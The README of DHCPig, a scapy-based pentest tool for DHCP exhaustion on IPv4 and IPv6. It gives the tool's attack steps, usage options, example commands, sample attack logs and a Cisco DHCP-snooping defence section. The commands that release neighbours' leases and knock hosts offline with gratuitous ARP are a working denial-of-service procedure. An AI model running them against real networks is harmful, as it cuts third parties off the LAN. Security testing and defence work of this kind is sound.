DHCPig
======

Tags#: DHCP, IPv4, IPv6, exhaustion, pentest, fuzzing, security, scapy

SUMMARY
-------

DHCPig initiates an advanced DHCP exhaustion attack. It will consume all IPs on the LAN, stop new users from obtaining IPs,
release any IPs in use, then for good measure send gratuitous ARP and knock all windows hosts offline.

It requires scapy >=2.1 library and admin privileges to execute. No configuration necessary, just pass the interface as 
a parameter. It has been tested on multiple Linux distributions and multiple DHCP servers (ISC,Windows 2k3/2k8,..).


When executed the script will perform the following actions:

* Grab your Neighbors IPs before they do   
	Listen for DHCP Requests from other clients if offer detected, respond with request for that offer.   

* Request all available IP addresses in Zone   
	Loop and Send DHCP Requests all from different hosts & MAC addresses  

* Find your Neighbors MAC & IP and release their IP from DHCP server   
	ARP for all neighbors on that LAN, then send DHCPReleases to server   
	

Finally the script will then wait for DHCP exhaustion, (that is no received DHCP OFFERs for 10 seconds)  and then 


* Knock all Windows systems offline   
	gratuitous ARP the LAN, and since no additional DHCP addresses are available these windows systems should stay 
offline.  Linux systems will not give up IP even when another system on LAN is detected with same IP.


PROTOCOL
--------
* __IPv4__
	 * SEQUENCE
		  1. ----> DHCP_DISCOVER 
		  2. <---- DHCP_OFFER    
		  3. ----> DHCP_REQUEST  
		  4. <---- DHCP_REPLY (ACK/NACK)	
	 * DHCPd snoop detection (DHCPd often checks if IP is in use)
		  * Check for ARP_Snoops 
		  * Check for ICMP Snoops 

* __IPv6__
	* SEQUENCE
		1. ----> DHCP6_SOLICIT  
		2. <---- DHCP6_ADVERTISE 
		3. ----> DHCP6_REQUEST   
		4. <---- DHCP6_REPLY    
	 * DHCPd snoop detection (DHCPd often checks if IP is in use)
	  	* Check for ICMPv6 Snoops 

CHANGELOG
-----
	 1.5 : 3-2017 : Better support for WiFi.  pig no longer spoofs the ethernet frame src MAC address, just chaddr.  
         Updated DHCP fingerprint to match existing operating systems.  Some routers will only respond to known devices.
         Changed the BOOTP flag to broadcast from unicast.  FIOS routers will only respond if broadcast BOOTP option is set.
         Feedback welcome, pig is now running well on the networks we have tested on.

USAGE
-----
	enhanced DHCP exhaustion attack plus.
	
	Usage:
	    pig.py [-h -v -6 -1 -s -f -t -a -i -o -l -x -y -z -g -r -n -c ] <interface>
	  
	Options:
	    -h, --help                     <-- you are here :)
	    -v, --verbosity                ...  0 ... no         (3)
	                                        1 ... minimal
	                                       10 ... default
	                                       99 ... debug
	                                       
	    -6, --ipv6                     ... DHCPv6 (off, DHCPv4 by default)
	    -1, --v6-rapid-commit          ... enable RapidCommit (2way ip assignment instead of 4way) (off)
	    
	    -s, --client-src               ... a list of client macs 00:11:22:33:44:55,00:11:22:33:44:56 (Default: <random>)
	    -O, --request-options          ... option-codes to request e.g. 21,22,23 or 12,14-19,23 (Default: 0-80)
	    
	    -f, --fuzz                     ... randomly fuzz packets (off)
	
	    -t, --threads                  ... number of sending threads (1)
	    
	    -a, --show-arp                 ... detect/print arp who_has (off)
	    -i, --show-icmp                ... detect/print icmps requests (off)
	    -o, --show-options             ... print lease infos (off)
	    -l, --show-lease-confirm       ... detect/print dhcp replies (off)
	    
	    -g, --neighbors-attack-garp    ... knock off network segment using gratious arps (off)
	    -r, --neighbors-attack-release ... release all neighbor ips (off)
	    -n, --neighbors-scan-arp       ... arp neighbor scan (off)
	    
	    -x, --timeout-threads          ... thread spawn timer (0.4)
	    -y, --timeout-dos              ... DOS timeout (8) (wait time to mass grat.arp)
	    -z, --timeout-dhcprequest      ... dhcp request timeout (2)
	    
	    -c, --color                    ... enable color output (off)


EXAMPLE
-------

    ./pig.py eth1
    ./pig.py --show-options eth1
    ./pig.py -x1 --show-options eth1
    
    ./pig.py -6 eth1
    ./pig.py -6 --fuzz eth1
    ./pig.py -6 -c -verbosity=1 eth1
    ./pig.py -6 -c -verbosity=3 eth1
    ./pig.py -6 -c -verbosity=100 eth1
    
    ./pig.py --neighbors-scan-arp -r -g --show-options eth1


ACTION-SHOTS
-------------

IPv4

	x@<:/src/DHCPig# ./pig.py -c -v3  -l -a -i -o eth2
	[ -- ] [INFO] - using interface eth2
	[DBG ] Thread 0 - (Sniffer) READY
	[DBG ] Thread 1 - (Sender) READY
	[--->] DHCP_Discover
	[ <- ] ARP_Request 172.20.0.40 from 172.20.15.1
	[--->] DHCP_Discover
	[ <- ] ARP_Request 172.20.0.41 from 172.20.15.1
	[--->] DHCP_Discover
	[ <- ] ARP_Request 172.20.0.42 from 172.20.15.1
	[<---] DHCP_Offer   00:0c:29:da:53:f9   0.0.0.0 IP: 172.20.0.40 for MAC=[de:ad:26:4b:d3:40]
	[DBG ]  * xid=154552584
	[DBG ]  * CIaddr='0.0.0.0'
	[DBG ]  * YIaddr='172.20.0.40'
	[DBG ]  * SIaddr='0.0.0.0'
	[DBG ]  * GIaddr='0.0.0.0'
	[DBG ]  * CHaddr='\xde\xad&K\xd3@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	[DBG ]  * Sname='ISCdhcpd'
	[DBG ]          * message-type  (2,)
	[DBG ]          * server_id     ('172.20.15.1',)
	[DBG ]          * lease_time    (60000,)
	[DBG ]          * subnet_mask   ('255.254.0.0',)
	[DBG ]          * router        ('172.20.15.1',)
	[DBG ]          * 39    ('\x01\x01\x01\x00\xac\x14\x0f\x01',)
	[--->] DHCP_Request 172.20.0.40
	[ <- ] ARP_Request 172.20.0.40 from 172.20.15.1
	[--->] DHCP_Discover
	[ <- ] ARP_Request 172.20.0.41 from 172.20.15.1
	^C[ -- ]  -----  ABORT ...  -----
	[DBG ] Waiting for Thread 0 to die ...
	[DBG ] Waiting for Thread 1 to die ...


IPv6

	x@y:/src/DHCPig# ./pig.py -6 -c -v3  -l eth3
	[ -- ] [INFO] - using interface eth3
	[DBG ] Thread 0 - (Sniffer) READY
	[DBG ] Thread 1 - (Sender) READY
	[--->] v6_DHCP_Discover [cid:'\x00\x01\x00\x01QR\xf3\xc7\xde\xad#d\xee\xed']
	[<---] v6 ADVERTISE FROM ['00:0c:29:da:53:ef'] -> ['de:ad:23:64:ee:ed'] - LEASE: IPv6[fc11:5:5:5::1:7120]
	[--->] v6 REQUEST ACK IPv6[fc11:5:5:5::1:7120]
	[<---] v6 ADVERTISE FROM ['00:0c:29:da:53:ef'] -> ['de:ad:23:64:ee:ed'] - LEASE: IPv6[fc11:5:5:5::1:7120]
	[--->] v6 REQUEST ACK IPv6[fc11:5:5:5::1:7120]
	[ <- ] v6 DHCP REPLY FROM ['00:0c:29:da:53:ef'] -> ['de:ad:23:64:ee:ed'] - LEASE: IPv6[fc11:5:5:5::1:7120]
	[--->] v6_DHCP_Discover [cid:'\x00\x01\x00\x01QR\xf3\xc8\xde\xad\x00|\xa8P']
	[<---] v6 ADVERTISE FROM ['00:0c:29:da:53:ef'] -> ['de:ad:00:7c:a8:50'] - LEASE: IPv6[fc11:5:5:5::1:e447]
	[--->] v6 REQUEST ACK IPv6[fc11:5:5:5::1:e447]
	[<---] v6 ADVERTISE FROM ['00:0c:29:da:53:ef'] -> ['de:ad:00:7c:a8:50'] - LEASE: IPv6[fc11:5:5:5::1:e447]
	[--->] v6 REQUEST ACK IPv6[fc11:5:5:5::1:e447]
	[ <- ] v6 DHCP REPLY FROM ['00:0c:29:da:53:ef'] -> ['de:ad:00:7c:a8:50'] - LEASE: IPv6[fc11:5:5:5::1:e447]
	[--->] v6_DHCP_Discover [cid:'\x00\x01\x00\x01QR\xf3\xc8\xde\xad%\x07\nQ']
	[<---] v6 ADVERTISE FROM ['00:0c:29:da:53:ef'] -> ['de:ad:25:07:0a:51'] - LEASE: IPv6[fc11:5:5:5::1:2644]
	[--->] v6 REQUEST ACK IPv6[fc11:5:5:5::1:2644]
	[ <- ] v6 DHCP REPLY FROM ['00:0c:29:da:53:ef'] -> ['de:ad:25:07:0a:51'] - LEASE: IPv6[fc11:5:5:5::1:2644]

	
	x@y:/src/DHCPig# ./pig.py -6 -c -v3  -l -a -i -o eth3
	[ -- ] [INFO] - using interface eth3
	[DBG ] Thread 0 - (Sniffer) READY
	[DBG ] Thread 1 - (Sender) READY
	[--->] v6_DHCP_Discover [cid:'\x00\x01\x00\x01QR\xf4\x1d\xde\xad\x00`wg']
	[ <- ] v6 ICMP REQUEST FROM [00:0c:29:da:53:ef] -> [fe80::20c:29ff:fef8:a1c8]
	[<---] v6 ADVERTISE FROM ['00:0c:29:da:53:ef'] -> ['de:ad:00:60:77:67'] - LEASE: IPv6[fc11:5:5:5::1:4e89]
	[DBG ]  * <bound method DHCP6_Advertise.show of <DHCP6_Advertise  msgtype=ADVERTISE trid=0xfb5429
	[DBG ]  * DHCP6OptIA_NA  optcode=IA_NA optlen=40 iaid=0xf T1=0 T2=0 ianaopts=[<DHCP6OptIAAddress  optcode=IAADDR optlen=24 addr=fc11:5:5:5::1:4e89 preflft=375 validlft=600 |>]
	[DBG ]  * DHCP6OptClientId  optcode=CLIENTID optlen=14 duid=<DUID_LLT  type=Link-layer address plus time hwtype=Ethernet (10Mb) timeval=Fri, 27 Mar 2043 13:29:01 +0000 (2311075741) lladdr=de:ad:00:60:77:67 |>
	[DBG ]  * DHCP6OptServerId  optcode=SERVERID optlen=14 duid=<DUID_LLT  type=Link-layer address plus time hwtype=Ethernet (10Mb) timeval=Tue, 26 Mar 2013 08:31:13 +0000 (1364286673) lladdr=00:0c:29:da:53:ef |>
	[DBG ]  * DHCP6OptDNSServers  optcode=DNS Recursive Name Server Option optlen=32 dnsservers=[ fc11:5:5:5::99, fc11:5:5:5::98 ]
	[DBG ]  * DHCP6OptNISPServers  optcode=OPTION_NISP_SERVERS optlen=16 nispservers=[ fc11:5:5:5::100 ]
	[DBG ]  * DHCP6OptNISPDomain  optcode=OPTION_NISP_DOMAIN_NAME optlen=11 nispdomain='myNISname' |>>>>>>>>
	[--->] v6 REQUEST ACK IPv6[fc11:5:5:5::1:4e89]
	[<---] v6 ADVERTISE FROM ['00:0c:29:da:53:ef'] -> ['de:ad:00:60:77:67'] - LEASE: IPv6[fc11:5:5:5::1:4e89]
	[DBG ]  * <bound method DHCP6_Advertise.show of <DHCP6_Advertise  msgtype=ADVERTISE trid=0xfb5429
	[DBG ]  * DHCP6OptIA_NA  optcode=IA_NA optlen=40 iaid=0xf T1=0 T2=0 ianaopts=[<DHCP6OptIAAddress  optcode=IAADDR optlen=24 addr=fc11:5:5:5::1:4e89 preflft=375 validlft=600 |>]
	[DBG ]  * DHCP6OptClientId  optcode=CLIENTID optlen=14 duid=<DUID_LLT  type=Link-layer address plus time hwtype=Ethernet (10Mb) timeval=Fri, 27 Mar 2043 13:29:01 +0000 (2311075741) lladdr=de:ad:00:60:77:67 |>
	[DBG ]  * DHCP6OptServerId  optcode=SERVERID optlen=14 duid=<DUID_LLT  type=Link-layer address plus time hwtype=Ethernet (10Mb) timeval=Tue, 26 Mar 2013 08:31:13 +0000 (1364286673) lladdr=00:0c:29:da:53:ef |>
	[DBG ]  * DHCP6OptDNSServers  optcode=DNS Recursive Name Server Option optlen=32 dnsservers=[ fc11:5:5:5::99, fc11:5:5:5::98 ]
	[DBG ]  * DHCP6OptNISPServers  optcode=OPTION_NISP_SERVERS optlen=16 nispservers=[ fc11:5:5:5::100 ]
	[DBG ]  * DHCP6OptNISPDomain  optcode=OPTION_NISP_DOMAIN_NAME optlen=11 nispdomain='myNISname' |>>>>>>>>
	[--->] v6 REQUEST ACK IPv6[fc11:5:5:5::1:4e89]
	[ <- ] v6 DHCP REPLY FROM ['00:0c:29:da:53:ef'] -> ['de:ad:00:60:77:67'] - LEASE: IPv6[fc11:5:5:5::1:4e89]
	^C[ -- ]  -----  ABORT ...  -----
	[DBG ] Waiting for Thread 0 to die ...
	[DBG ] Waiting for Thread 1 to die ...

Minimal Output (verbosity=1)

	. = DHCP_Discovery
	! = DHCP_Offer
	; = ICMP/ARP/DHCP_ACKs
	D = DEBUG output (show options, etc.)
	E = ERROR
	N = NOTICE / INFO

	x@y:/src/DHCPig# ./pig.py -6 -c -v1 -a -i -o -l eth3
	WARNING: No route found for IPv6 destination :: (no default route?)
	NDD.!DDDDDDD.!DDDDDDD.;;;;.!DDDDDDD.!DDDDDDD.;;;;.!DDDDDDD.;.!DDDDDDD.!DDDDDDD.;;.!DDDDDDD.;.!DDDDDDD.!DDDDDDD.;;.!DDDDDDD.;.!DDDDDDD.;tcpdump: WARNING: eth3: no IPv4 address assigned
	.!DDDDDDD.!DDDDDDD.;;.!DDDDDDD.;.!DDDDDDD.!DDDDDDD.;;.!DDDDDDD.;;.!DDDDDDD.!DDDDDDD.;;^CNDD
	
	x@y:/src/DHCPig# ./pig.py -6 -c -v1  -l eth3
	NDD!.!.;;;;.!.!.;;;;.!.;.!.!.;;.!.;.!.!.;;.!.;.!.;.!.!.;;.!.;^CNDD



DEFENSE
-------

most common approach to defending DHCP exhaustion is via access layer switching or wireless controllers.  

In cisco switching simplest option is to enable DHCP snooping.  Snooping will defend against pool exhaustion,
IP hijacking, and DHCP sever spoofing  all of which are used in DHCPig.   Based on examined traffic, DHCP 
snooping will create a mapping table from IP to mac on each port.  User access ports are then restricted to only 
the given IP.  Any DHCP server messages originating from untrusted ports are filtered.


enable the following to defend against pool exhaustion, IP hijacking, and DHCP sever spoofing:

* enable snooping 

    `ip dhcp snooping`
    
* specify which port your DHCP is associated with.  Most likely this is your uplink.  Doing the following will 
limit DHCP server responses to only the specified port, so use after testing in lab environment.

    `int fa0/1`  (or correct interface)

    `ip dhcp snooping trust`

* show status

    `show ip dhcp snopping`

    `show ip dhcp snopping binding`


* additional info:
http://www.cisco.com/en/US/docs/switches/lan/catalyst4500/12.1/12ew/configuration/guide/dhcp.pdf


CHANGES:
--------
more options, fixed v6 supoprt (LL src addr), color output, minimal and debug output
more options, double the fun: scapy fuzzing, ipv6 support
more options, more fun: show options/show icmp/show arp
fixed indents, beautify doc, eyefriendly one-line-logging


LICENSE:
--------
These scripts are all released under the GPL v2 or later.  For a full description of the licence, 
please visit [http://www.gnu.org/licenses/gpl.txt](http://www.gnu.org/licenses/gpl.txt)

DISCLAIMER:
---------
All information and software available on this site are for educational purposes only. The author 
is no way responsible for any misuse of the information.  

//Kevin

//tintin
